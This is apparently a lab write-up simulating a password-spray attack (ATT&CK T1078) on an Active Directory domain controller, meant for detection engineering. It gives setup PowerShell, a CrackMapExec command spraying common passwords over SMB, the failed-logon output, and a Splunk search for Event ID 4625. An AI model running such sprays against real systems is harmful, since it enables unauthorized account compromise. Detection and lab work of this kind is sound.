# Attack Simulation — T1078 Valid Accounts (Password Spray)

## Environment

| | |
|---|---|
| Attacker | kali (10.10.10.250) |
| Target | dc01 (10.10.10.10) — Active Directory domain controller for lab.local |
| Tool | CrackMapExec (pre-installed on kali) |
| Protocol | SMB (port 445) |

## Setup

Five domain users were created in lab.local prior to the simulation:

```powershell
# Run on dc01 via Ansible or PowerShell
$pw = ConvertTo-SecureString "Summer2024!" -AsPlainText -Force
"jsmith","mjones","adavis","bwilson","cjohnson" | ForEach-Object {
    New-ADUser -Name $_ -SamAccountName $_ -AccountPassword $pw -Enabled $true
}
```

## Execution

From kali, spray 3 common passwords against 6 accounts:

```bash
crackmapexec smb 10.10.10.10 \
  -u administrator jsmith mjones adavis bwilson cjohnson \
  -p 'Winter2024!' 'Spring2024!' 'Password1'
```

## Output

```
SMB  10.10.10.10  445  WIN-OS7LA9AC2K8  [-] lab.local\administrator:Winter2024! STATUS_LOGON_FAILURE
SMB  10.10.10.10  445  WIN-OS7LA9AC2K8  [-] lab.local\administrator:Spring2024! STATUS_LOGON_FAILURE
SMB  10.10.10.10  445  WIN-OS7LA9AC2K8  [-] lab.local\administrator:Password1 STATUS_LOGON_FAILURE
SMB  10.10.10.10  445  WIN-OS7LA9AC2K8  [-] lab.local\jsmith:Winter2024! STATUS_LOGON_FAILURE
SMB  10.10.10.10  445  WIN-OS7LA9AC2K8  [-] lab.local\jsmith:Spring2024! STATUS_LOGON_FAILURE
SMB  10.10.10.10  445  WIN-OS7LA9AC2K8  [-] lab.local\jsmith:Password1 STATUS_LOGON_FAILURE
SMB  10.10.10.10  445  WIN-OS7LA9AC2K8  [-] lab.local\mjones:Winter2024! STATUS_LOGON_FAILURE
SMB  10.10.10.10  445  WIN-OS7LA9AC2K8  [-] lab.local\mjones:Spring2024! STATUS_LOGON_FAILURE
SMB  10.10.10.10  445  WIN-OS7LA9AC2K8  [-] lab.local\mjones:Password1 STATUS_LOGON_FAILURE
SMB  10.10.10.10  445  WIN-OS7LA9AC2K8  [-] lab.local\adavis:Winter2024! STATUS_LOGON_FAILURE
SMB  10.10.10.10  445  WIN-OS7LA9AC2K8  [-] lab.local\adavis:Spring2024! STATUS_LOGON_FAILURE
SMB  10.10.10.10  445  WIN-OS7LA9AC2K8  [-] lab.local\adavis:Password1 STATUS_LOGON_FAILURE
SMB  10.10.10.10  445  WIN-OS7LA9AC2K8  [-] lab.local\bwilson:Winter2024! STATUS_LOGON_FAILURE
SMB  10.10.10.10  445  WIN-OS7LA9AC2K8  [-] lab.local\bwilson:Spring2024! STATUS_LOGON_FAILURE
SMB  10.10.10.10  445  WIN-OS7LA9AC2K8  [-] lab.local\bwilson:Password1 STATUS_LOGON_FAILURE
SMB  10.10.10.10  445  WIN-OS7LA9AC2K8  [-] lab.local\cjohnson:Winter2024! STATUS_LOGON_FAILURE
SMB  10.10.10.10  445  WIN-OS7LA9AC2K8  [-] lab.local\cjohnson:Spring2024! STATUS_LOGON_FAILURE
SMB  10.10.10.10  445  WIN-OS7LA9AC2K8  [-] lab.local\cjohnson:Password1 STATUS_LOGON_FAILURE
```

18 failures, 0 successes — all passwords incorrect as expected for the simulation.

## What to look for in Splunk

Within seconds of running the spray, dc01 generates 18 Event ID 4625 events. Search:

```spl
index=wineventlog EventCode=4625 Logon_Type=3 Source_Network_Address=10.10.10.250
| table _time, Account_Name, Status, Source_Network_Address
| sort _time
```
